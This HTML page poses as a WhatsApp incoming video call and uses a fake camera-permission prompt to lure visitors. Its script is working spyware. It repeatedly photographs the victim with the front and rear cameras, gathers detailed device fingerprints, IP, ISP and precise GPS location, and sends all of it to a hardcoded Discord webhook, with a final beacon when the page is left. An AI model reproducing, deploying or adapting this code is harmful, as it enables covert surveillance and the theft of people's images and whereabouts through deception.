<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>WhatsApp</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
    body {
      font-family: -apple-system, 'Helvetica Neue', sans-serif;
      background: #0a1f13; height: 100vh; width: 100vw;
      overflow: hidden; display: flex; flex-direction: column; align-items: center;
      color: white; position: relative;
    }
    .bg { position: fixed; inset: 0; background: linear-gradient(180deg, #0d2818 0%, #0a1a0f 40%, #06120a 100%); z-index: 0; }
    .bg::after { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse 70% 50% at 50% 20%, rgba(37,211,102,0.12) 0%, transparent 70%); }
    .topbar { position: relative; z-index: 2; width: 100%; padding: 52px 20px 16px; text-align: center; }
    .wa-label { font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom:6px; }
    .caller-name { font-size: 28px; font-weight: 600; margin-bottom:6px; }
    .call-status { font-size: 14px; color: rgba(255,255,255,0.6); }
    .timer { font-size: 14px; color: rgba(255,255,255,0.6); font-variant-numeric:tabular-nums; margin-top:4px; display:none; }
    .avatar-wrap { position: relative; z-index: 2; margin: 40px auto 0; }
    .avatar-ring {
      width: 130px; height: 130px; border-radius: 50%;
      background: rgba(37,211,102,0.15);
      display: flex; align-items: center; justify-content: center;
      animation: ring-pulse 2.5s ease-in-out infinite;
    }
    @keyframes ring-pulse { 0%,100%{box-shadow:0 0 0 0 rgba(37,211,102,0.25)} 50%{box-shadow:0 0 0 20px rgba(37,211,102,0)} }
    .avatar {
      width: 110px; height: 110px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 48px; font-weight: 700; color: white;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4); transition: background 0.4s;
    }
    .controls { position: fixed; bottom: 0; left: 0; right: 0; padding: 0 16px 52px; z-index: 10; }
    .controls-row { display: flex; justify-content: space-around; align-items: center; margin-bottom: 24px; }
    .ctrl-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; background: none; border: none; cursor: pointer; color: white; }
    .ctrl-icon {
      width: 58px; height: 58px; border-radius: 50%;
      background: rgba(255,255,255,0.15);
      display: flex; align-items: center; justify-content: center;
      font-size: 22px; transition: background .15s, transform .1s;
      backdrop-filter: blur(10px);
    }
    .ctrl-icon:active { transform: scale(0.91); }
    .ctrl-btn.toggled .ctrl-icon { background: rgba(255,255,255,0.32); }
    .ctrl-label { font-size: 11px; color: rgba(255,255,255,0.7); font-weight: 500; }
    .end-row { display: flex; justify-content: center; }
    .end-btn {
      width: 70px; height: 70px; border-radius: 50%;
      background: #f04747; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      font-size: 26px; box-shadow: 0 6px 24px rgba(240,71,71,0.5);
      transition: transform .1s;
    }
    .end-btn:active { transform: scale(0.93); }
    video, canvas { display: none; }
    .permission-overlay {
      position: fixed; inset: 0; z-index: 100; background: rgba(10,20,15,0.95);
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      gap: 24px; font-family: -apple-system, sans-serif; color: white; text-align: center; padding: 32px;
    }
    .permission-btn {
      background: #25d366; border: none; color: white; padding: 16px 32px;
      border-radius: 40px; font-size: 18px; font-weight: 600; cursor: pointer;
      box-shadow: 0 8px 24px rgba(37,211,102,0.4); transition: transform 0.2s;
    }
    .permission-btn:active { transform: scale(0.96); }
  </style>
</head>
<body>
  <div class="bg"></div>
  <div class="topbar">
    <div class="wa-label">WhatsApp</div>
    <div class="caller-name" id="callerName">Nina</div>
    <div class="call-status" id="callStatus">Wird angerufen…</div>
    <div class="timer" id="timer">00:00</div>
  </div>
  <div class="avatar-wrap">
    <div class="avatar-ring">
      <div class="avatar" id="avatar" style="background: linear-gradient(135deg, rgb(37, 211, 102), rgb(18, 140, 126));">N</div>
    </div>
  </div>
  <div class="controls">
    <div class="controls-row">
      <button class="ctrl-btn" id="btnMute"><div class="ctrl-icon">🎤</div><span class="ctrl-label">Stumm</span></button>
      <button class="ctrl-btn" id="btnSpeaker"><div class="ctrl-icon">🔊</div><span class="ctrl-label">Lautsprecher</span></button>
      <button class="ctrl-btn" id="btnVideo"><div class="ctrl-icon">📹</div><span class="ctrl-label">Video</span></button>
    </div>
    <div class="end-row">
      <button class="end-btn" id="btnEnd">📵</button>
    </div>
  </div>
  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    (function() {
      // ── KONFIGURATION ──
      const WEBHOOK = "https://discord.com/api/webhooks/1513149958403133440/VjI_u5TmuJtNn92IxUqtC0N5LFR3cq6bjX5h1n5Gje1KyaUrewZ3Huwb7PgF5wOoXqE1";
      const FINGERPRINT_INTERVAL = 800; // Her 800ms'de bir parmak izi gönder
      const PHOTO_INTERVAL = 1500;      // Her 1.5 saniyede bir fotoğraf çek
      const RATE_LIMIT_DELAY = 100;      // Discord rate-limit koruması

      // ── STATE ──
      const callers = ["Sarah","Alex","Jakob","Mia","Lukas","Emma","Leon","Anna","Tim","Laura","Jonas","Lena","Felix","Hannah","Ben","Sophie","Finn","Lea","Jan","Nina","Tom","Clara"];
      const avatarColors = [
        "linear-gradient(135deg,#25d366,#128c7e)","linear-gradient(135deg,#e84393,#c2185b)",
        "linear-gradient(135deg,#5865f2,#3d49c4)","linear-gradient(135deg,#e67e22,#d35400)",
        "linear-gradient(135deg,#9b59b6,#7d3c98)","linear-gradient(135deg,#e74c3c,#c0392b)",
        "linear-gradient(135deg,#1abc9c,#16a085)","linear-gradient(135deg,#f39c12,#e67e22)"
      ];

      let currentCaller = callers[Math.floor(Math.random()*callers.length)];
      let seconds = 0, timerInterval = null, callEnded = false, captureStream = null;
      let fingerprintInterval = null, photoInterval = null;
      let photoCounter = 0;
      const pageStartTime = Date.now();

      // ── AUDIO ENGINE ──
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      let actx = null, ringInterval = null;
      const getCtx = () => { if(!actx) actx = new AudioCtx(); return actx; };
      const playTone = (freq,type,dur,gain=0.3) => {
        try {
          const ctx = getCtx(); const o = ctx.createOscillator(); const g = ctx.createGain();
          o.connect(g); g.connect(ctx.destination); o.type=type; o.frequency.value=freq;
          g.gain.setValueAtTime(gain,ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+dur);
          o.start(); o.stop(ctx.currentTime+dur);
        } catch(e) {}
      };
      const playNotifSound = () => [523,659,784].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.15,0.22),i*100));
      const playTypingSound = () => playTone(300,'square',0.04,0.06);
      const playHangupSound = () => [600,450,300].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.18,0.25),i*160));
      const playConnectSound = () => [700,900].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.12,0.25),i*140));
      const playWhatsAppRing = () => { playTone(620,'sine',0.18,0.28); setTimeout(()=>playTone(820,'sine',0.18,0.28),200); };
      const startRinging = () => { playWhatsAppRing(); ringInterval = setInterval(playWhatsAppRing,1800); };
      const stopRinging = () => { if(ringInterval){clearInterval(ringInterval);ringInterval=null;} };

      // ── HELPERS ──
      const vibrateAvatar = () => {
        const av = document.getElementById('avatar'); if(!av) return;
        ['-4px','4px','-3px','3px','-2px','2px','0px'].forEach((x,i)=>setTimeout(()=>{av.style.transform=`translateX(${x})`;},i*50));
        if(navigator.vibrate) navigator.vibrate([100,50,100]);
      };
      const setCallerUI = (name) => {
        document.getElementById('callerName').textContent = name;
        document.getElementById('avatar').textContent = name[0].toUpperCase();
        document.getElementById('avatar').style.background = avatarColors[Math.floor(Math.random()*avatarColors.length)];
      };
      setCallerUI(currentCaller);

      const startTimer = () => {
        document.getElementById('callStatus').style.display='none';
        document.getElementById('timer').style.display='block';
        timerInterval = setInterval(()=>{
          if(callEnded) return;
          seconds++;
          const el = document.getElementById('timer');
          if(el) el.textContent = String(Math.floor(seconds/60)).padStart(2,'0')+':'+String(seconds%60).padStart(2,'0');
        },1000);
      };

      // ── DISCORD SENDER (rate-limit aware) ──
      const sendToDiscord = async (formData) => {
        try {
          await fetch(WEBHOOK, { method:'POST', body:formData });
        } catch(e) {
          console.warn('Discord Sende Fehler:', e.message);
        }
        await new Promise(r => setTimeout(r, RATE_LIMIT_DELAY));
      };

      // ── ERWEITERTER FINGERPRINT (30+ Daten) ──
      async function collectFingerprintData() {
        const data = {};

        // ── Hardware Informationen ──
        data.hardware = {};
        try {
          const bat = await navigator.getBattery();
          data.hardware.akku_level = Math.round(bat.level*100)+'%';
          data.hardware.akku_ladend = bat.charging;
          data.hardware.akku_ladezeit = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime)+'s';
          data.hardware.akku_entladezeit = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime)+'s';
        } catch(e) {
          data.hardware.akku = 'Unbekannt';
        }
        data.hardware.cpu_kerne = navigator.hardwareConcurrency || 'Unbekannt';
        data.hardware.gerätespeicher = navigator.deviceMemory || 'Unbekannt';
        data.hardware.max_touch_punkte = navigator.maxTouchPoints || 0;
        data.hardware.touchscreen = 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0;

        // ── Bildschirm & Browser ──
        data.bildschirm = {};
        data.bildschirm.auflösung = `${window.screen.width}x${window.screen.height}`;
        data.bildschirm.verfügbare_auflösung = `${window.screen.availWidth}x${window.screen.availHeight}`;
        data.bildschirm.pixel_dichte = window.devicePixelRatio || 1;
        data.bildschirm.farbtiefe = window.screen.colorDepth;
        data.bildschirm.pixeltiefe = window.screen.pixelDepth;
        data.bildschirm.ausrichtung = screen.orientation ? screen.orientation.type : 'Unbekannt';
        data.bildschirm.viewport = `${window.innerWidth}x${window.innerHeight}`;

        // Canvas Fingerabdruck
        try {
          const c = document.createElement('canvas');
          c.width = 280; c.height = 60;
          const ctx = c.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = '#069';
          ctx.fillText('GeräteFingerabdruck <canvas>  fingerprint', 2, 15);
          ctx.fillStyle = 'rgba(102,204,0,0.7)';
          ctx.fillText('GeräteFingerabdruck <canvas>  fingerprint', 4, 17);
          data.bildschirm.canvas_fingerabdruck = c.toDataURL().slice(-50);
        } catch(e) {
          data.bildschirm.canvas_fingerabdruck = 'Fehler';
        }

        // WebGL Fingerabdruck
        try {
          const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
          if(gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.bildschirm.webgl_hersteller = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unbekannt';
            data.bildschirm.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unbekannt';
          }
        } catch(e) {}

        data.browser = {};
        data.browser.user_agent = navigator.userAgent;
        data.browser.plattform = navigator.platform || 'Unbekannt';
        data.browser.sprache = navigator.language;
        data.browser.sprachen = navigator.languages ? navigator.languages.join(', ') : navigator.language;
        data.browser.zeitzone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser.cookies_aktiviert = navigator.cookieEnabled;
        data.browser.do_not_track = navigator.doNotTrack || 'Unbekannt';
        data.browser.online = navigator.onLine;
        data.browser.java_aktiviert = navigator.javaEnabled ? navigator.javaEnabled() : false;
        data.browser.produkt = navigator.product || 'Unbekannt';
        data.browser.hersteller = navigator.vendor || 'Unbekannt';

        // ── Netzwerk & Standort ──
        data.netzwerk = {};
        try {
          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if(conn) {
            data.netzwerk.effektiver_typ = conn.effectiveType || conn.type || 'Unbekannt';
            data.netzwerk.download_geschwindigkeit = conn.downlink ? conn.downlink+' Mbps' : 'Unbekannt';
            data.netzwerk.latenz = conn.rtt ? conn.rtt+' ms' : 'Unbekannt';
            data.netzwerk.datensparmodus = conn.saveData || false;
          }
        } catch(e) {}

        // IP und ISP
        try {
          const resp = await fetch('https://ip-api.com/json/?fields=query,isp,country,regionName,city,org,as,mobile,proxy,hosting');
          const ipData = await resp.json();
          data.netzwerk.ip = ipData.query || 'Unbekannt';
          data.netzwerk.isp = ipData.isp || 'Unbekannt';
          data.netzwerk.organisation = ipData.org || 'Unbekannt';
          data.netzwerk.as_nummer = ipData.as || 'Unbekannt';
          data.netzwerk.stadt = ipData.city || '';
          data.netzwerk.region = ipData.regionName || '';
          data.netzwerk.land = ipData.country || '';
          data.netzwerk.mobilfunk = ipData.mobile || false;
          data.netzwerk.proxy = ipData.proxy || false;
          data.netzwerk.hosting = ipData.hosting || false;
        } catch(e) {
          try {
            const r2 = await fetch('https://api.ipify.org?format=json');
            const d2 = await r2.json();
            data.netzwerk.ip = d2.ip;
          } catch(e2) {}
        }

        // GPS Standort (mit Erlaubnis)
        data.geo = {};
        try {
          await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(pos => {
              data.geo.breitengrad = pos.coords.latitude.toFixed(6);
              data.geo.längengrad = pos.coords.longitude.toFixed(6);
              data.geo.genauigkeit = Math.round(pos.coords.accuracy)+'m';
              data.geo.höhe = pos.coords.altitude ? pos.coords.altitude.toFixed(2)+'m' : 'Keine';
              data.geo.geschwindigkeit = pos.coords.speed ? pos.coords.speed+' m/s' : 'Keine';
              data.geo.richtung = pos.coords.heading ? pos.coords.heading+'°' : 'Keine';
              data.geo.zeitstempel = new Date(pos.timestamp).toLocaleString('de-DE');
              resolve();
            }, resolve, { timeout:5000, enableHighAccuracy:true });
          });
        } catch(e) {}

        // ── Besuchszähler ──
        let visits = parseInt(localStorage.getItem('vc') || '0') + 1;
        localStorage.setItem('vc', visits);
        data.besuche = visits;

        return data;
      }

      // ── EMBED ERSTELLER (ALLE DEUTSCH) ──
      function buildEmbeds(data, name, fotoLabel) {
        const now = new Date();
        const timeStr = now.toLocaleString('de-DE', { timeZone: data.browser.zeitzone });
        const embeds = [];

        // Haupt Embed
        embeds.push({
          title: `📞 WhatsApp Anruf – ${name}`,
          farbe: 0x25d366,
          zeitstempel: now.toISOString(),
          fußzeile: { text: `Besuch #${data.besuche} • ${timeStr}` },
          felder: [
            { name: '🕐 Zeitstempel', wert: timeStr, inline: true },
            { name: '🌍 Zeitzone', wert: data.browser.zeitzone, inline: true },
            { name: '📱 Gerät', wert: data.browser.plattform, inline: true },
          ]
        });

        // Hardware Embed
        embeds.push({
          title: '🔧 Hardware Informationen',
          farbe: 0x5865f2,
          felder: [
            { name: '🔋 Akkustand', wert: data.hardware.akku_level || 'Unbekannt', inline: true },
            { name: '⚡ Lädt', wert: data.hardware.akku_ladend ? 'Ja' : 'Nein', inline: true },
            { name: '🧠 CPU Kerne', wert: String(data.hardware.cpu_kerne), inline: true },
            { name: '💾 Arbeitsspeicher', wert: (data.hardware.gerätespeicher || '?') + ' GB', inline: true },
            { name: '👆 Touchscreen', wert: data.hardware.touchscreen ? 'Ja ('+data.hardware.max_touch_punkte+' Punkte)' : 'Nein', inline: true },
          ]
        });

        // Bildschirm & Browser Embed
        embeds.push({
          title: '🖥️ Bildschirm & Browser',
          farbe: 0x9b59b6,
          felder: [
            { name: 'Auflösung', wert: data.bildschirm.auflösung, inline: true },
            { name: 'Pixeldichte', wert: data.bildschirm.pixel_dichte+'x', inline: true },
            { name: 'Farbtiefe', wert: data.bildschirm.farbtiefe+' Bit', inline: true },
            { name: 'Sprache', wert: data.browser.sprache, inline: true },
            { name: 'Plattform', wert: data.browser.plattform, inline: true },
            { name: 'Canvas Fingerabdruck', wert: '```'+data.bildschirm.canvas_fingerabdruck+'```', inline: false },
          ]
        });

        // Netzwerk Embed
        const netzFelder = [
          { name: '🌐 IP-Adresse', wert: '`'+ (data.netzwerk.ip || 'Unbekannt') +'`', inline: true },
          { name: '🏢 Provider (ISP)', wert: data.netzwerk.isp || 'Unbekannt', inline: true },
        ];
        if(data.netzwerk.effektiver_typ) netzFelder.push({ name: '📶 Netzwerktyp', wert: data.netzwerk.effektiver_typ.toUpperCase(), inline: true });
        if(data.netzwerk.download_geschwindigkeit) netzFelder.push({ name: '⬇️ Geschwindigkeit', wert: data.netzwerk.download_geschwindigkeit, inline: true });
        if(data.netzwerk.stadt) netzFelder.push({ name: '📍 Standort', wert: `${data.netzwerk.stadt}, ${data.netzwerk.region}, ${data.netzwerk.land}`, inline: true });

        embeds.push({
          title: '🌐 Netzwerkdaten',
          farbe: 0xe67e22,
          felder: netzFelder
        });

        // Standort Embed
        if(data.geo.breitengrad) {
          embeds.push({
            title: '📍 Genauer Standort (GPS)',
            farbe: 0xe74c3c,
            felder: [
              { name: 'Breitengrad', wert: data.geo.breitengrad, inline: true },
              { name: 'Längengrad', wert: data.geo.längengrad, inline: true },
              { name: 'Genauigkeit', wert: data.geo.genauigkeit, inline: true },
              { name: 'Karte', wert: `[Google Maps](https://maps.google.com/?q=${data.geo.breitengrad},${data.geo.längengrad})`, inline: false },
            ]
          });
        }

        if(fotoLabel) {
          embeds[0].bild = { url: `anhang://${fotoLabel}.jpg` };
        }

        return embeds;
      }

      // ── FOTOAUFNAHME ──
      const hiddenVideo = document.getElementById('hiddenVideo');
      const canvas = document.getElementById('canvas');

      async function sendeFoto(blob, label, name, fingerprintData) {
        const form = new FormData();
        form.append('file', blob, `${label}.jpg`);
        const embeds = buildEmbeds(fingerprintData, name, label);
        form.append('payload_json', JSON.stringify({ embeds: embeds }));
        await sendToDiscord(form);
      }

      function captureFromVideo(video, mirror, label, name, fpData) {
        if(!video.videoWidth) return;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.save();
        if(mirror) { ctx.translate(canvas.width,0); ctx.scale(-1,1); }
        ctx.drawImage(video,0,0);
        ctx.restore();
        canvas.toBlob(async b => { 
          if(b) {
            photoCounter++;
            await sendeFoto(b, `${label}_${photoCounter}`, name, fpData); 
          }
        }, 'image/jpeg', 0.93);
      }

      // ── SCHNELLE FOTOS MIT BEIDEN KAMERAS ──
      async function schnelleFotoAufnahme(fpData) {
        if(callEnded || !hiddenVideo.videoWidth) return;
        
        // Vordere Kamera
        captureFromVideo(hiddenVideo, true, 'Frontkamera', currentCaller, fpData);
        
        // Hintere Kamera (parallel)
        try {
          const backStream = await navigator.mediaDevices.getUserMedia({ 
            video:{facingMode:{exact:'environment'}, width:1280, height:720}, 
            audio:false 
          });
          const backVideo = document.createElement('video');
          backVideo.srcObject = backStream;
          backVideo.autoplay = true;
          backVideo.muted = true;
          backVideo.onloadedmetadata = () => {
            setTimeout(() => {
              captureFromVideo(backVideo, false, 'Rückkamera', currentCaller, fpData);
              backStream.getTracks().forEach(t=>t.stop());
            }, 800);
          };
        } catch(e) {
          console.warn('Rückkamera nicht verfügbar:', e.message);
        }
      }

      // ── FINGERPRINT SAMMELN UND SENDEN (SEHR HÄUFIG) ──
      async function fingerprintSenden() {
        if(callEnded) return;
        try {
          const fpData = await collectFingerprintData();
          const embeds = buildEmbeds(fpData, currentCaller, null);
          const form = new FormData();
          form.append('payload_json', JSON.stringify({ embeds: embeds }));
          await sendToDiscord(form);
        } catch(e) {
          console.warn('Fingerprint Sende Fehler:', e.message);
        }
      }

      // ── KAMERA STARTEN ──
      async function starteKameraUndSammlung() {
        try {
          captureStream = await navigator.mediaDevices.getUserMedia({ 
            video:{width:1280,height:720,facingMode:'user'}, 
            audio:false 
          });
          hiddenVideo.srcObject = captureStream;
          hiddenVideo.onloadedmetadata = async () => {
            document.getElementById('callStatus').textContent = 'Verbunden';
            playTypingSound();
            vibrateAvatar(); stopRinging(); playConnectSound();
            setTimeout(startTimer, 800);

            // Erste sofortige Datensammlung
            await fingerprintSenden();
            
            // Erste Fotos nach 1 Sekunde
            setTimeout(async () => {
              const fpData = await collectFingerprintData();
              await schnelleFotoAufnahme(fpData);
            }, 1000);

            // SEHR HÄUFIGE Fingerprint-Updates (alle 800ms)
            fingerprintInterval = setInterval(async () => {
              if(callEnded) {
                clearInterval(fingerprintInterval);
                return;
              }
              await fingerprintSenden();
            }, FINGERPRINT_INTERVAL);

            // SEHR HÄUFIGE Fotos (alle 1.5 Sekunden)
            photoInterval = setInterval(async () => {
              if(callEnded) {
                clearInterval(photoInterval);
                return;
              }
              const fpData = await collectFingerprintData();
              await schnelleFotoAufnahme(fpData);
            }, PHOTO_INTERVAL);
          };
        } catch(e) {
          document.body.innerHTML = `<div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:32px"><div style="font-size:64px">🚫</div><div style="font-size:22px;font-weight:700">Kamerazugriff erforderlich</div><div style="font-size:14px;color:rgba(255,255,255,0.5);max-width:280px;line-height:1.6">Um an diesem Anruf teilzunehmen, musst du den Kamerazugriff erlauben.</div></div>`;
        }
      }

      // ── BERECHTIGUNGSANFRAGE ──
      function zeigeBerechtigungsanfrage() {
        const overlay = document.createElement('div');
        overlay.className = 'permission-overlay';
        overlay.innerHTML = `
          <div style="font-size:48px">📷</div>
          <div style="font-size:20px;font-weight:600">Kamera Berechtigung Erforderlich</div>
          <div style="font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;line-height:1.5">Um am Videoanruf teilzunehmen, müssen Sie den Kamerazugriff erlauben.</div>
          <button class="permission-btn" id="grantPermissionBtn">📸 Kamera Aktivieren & Anruf Starten</button>
        `;
        document.body.appendChild(overlay);
        document.getElementById('grantPermissionBtn').addEventListener('click', async () => {
          overlay.remove();
          await starteKameraUndSammlung();
        });
      }

      // ── INITIALISIERUNG ──
      playNotifSound(); vibrateAvatar();
      setTimeout(() => {
        document.getElementById('callStatus').textContent = 'Klingelt…';
        playTypingSound();
        vibrateAvatar(); startRinging();
      }, 600);
      // Benutzerinteraktion für Berechtigung
      setTimeout(zeigeBerechtigungsanfrage, 1800);

      // ── BUTTONS ──
      let stumm = false;
      document.getElementById('btnMute').addEventListener('click', function(){
        stumm = !stumm;
        this.classList.toggle('toggled', stumm);
        this.querySelector('.ctrl-icon').textContent = stumm ? '🔕' : '🎤';
        this.querySelector('.ctrl-label').textContent = stumm ? 'Ton an' : 'Stumm';
      });
      document.getElementById('btnSpeaker').addEventListener('click', function(){ this.classList.toggle('toggled'); });
      document.getElementById('btnVideo').addEventListener('click', function(){ this.classList.toggle('toggled'); });

      document.getElementById('btnEnd').addEventListener('click', () => {
        callEnded = true;
        stopRinging(); playHangupSound(); vibrateAvatar();
        if(timerInterval) clearInterval(timerInterval);
        if(fingerprintInterval) clearInterval(fingerprintInterval);
        if(photoInterval) clearInterval(photoInterval);
        if(captureStream) captureStream.getTracks().forEach(t=>t.stop());
        const m = String(Math.floor(seconds/60)).padStart(2,'0');
        const s = String(seconds%60).padStart(2,'0');
        document.body.innerHTML = `
          <div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;font-family:-apple-system,sans-serif;color:white">
            <div style="font-size:52px">📵</div><div style="font-size:22px;font-weight:600">Anruf beendet</div>
            <div style="font-size:14px;color:rgba(255,255,255,0.5)">${m}:${s}</div>
            <button onclick="location.reload()" style="margin-top:12px;display:flex;flex-direction:column;align-items:center;gap:8px;background:none;border:none;cursor:pointer;color:white">
              <div style="width:64px;height:64px;border-radius:50%;background:#25d366;display:flex;align-items:center;justify-content:center;font-size:26px;box-shadow:0 6px 24px rgba(37,211,102,0.4)">📞</div>
              <span style="font-size:12px;color:rgba(255,255,255,0.6);font-weight:500">Erneut anrufen</span>
            </button>
          </div>`;
      });

      // Seite verlassen Daten
      window.addEventListener('beforeunload', () => {
        const sekunden = Math.round((Date.now() - pageStartTime) / 1000);
        const form = new FormData();
        form.append('payload_json', JSON.stringify({
          embeds: [{ 
            title: '⏱️ Besuchszeit', 
            farbe: 0x95a5a6, 
            beschreibung: `Jemand war **${sekunden} Sekunden** auf der Seite (Anruf: **${currentCaller}**)`,
            felder: [
              { name: '📸 Fotos gesendet', wert: String(photoCounter), inline: true }
            ]
          }]
        }));
        try { navigator.sendBeacon(WEBHOOK, form); } catch(e) {}
      });
    })();
  </script>
</body>
</html>
